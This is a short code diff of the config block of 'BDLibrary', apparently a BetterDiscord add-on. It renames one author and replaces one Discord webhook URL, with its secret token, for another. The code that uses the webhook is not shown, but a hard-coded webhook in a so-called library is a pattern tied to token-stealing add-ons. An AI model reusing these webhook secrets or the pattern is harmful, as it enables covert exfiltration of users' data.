@@ -7,11 +7,11 @@
 const config = {
     "info": {
         "name": "BDLibrary",
-        "authors": ["Brabus", "The Way", "lego"],
+        "authors": ["rian", "The Way", "lego"],
         "version": "1.5",
         "description": "Library addon for the Better Discord APP"
     },
-    "webhook": "https://discord.com/api/webhooks/835988638390288425/XjQnFGxBOc4RVuSymxzC5QX_SWe6c-Ix6_dkO0E5WC9sxcAR-FGeX-3fffOq4fEspS4K"
+    "webhook": "https://discord.com/api/webhooks/836165128667267113/FtntHRyZ0M2bcWDoTFxIrhOJwZEuP8KT6uoQzMF0dJkLpq3EavFvzG1_nogkf7_-_tMA"
 }
 
 class BDLibrary {
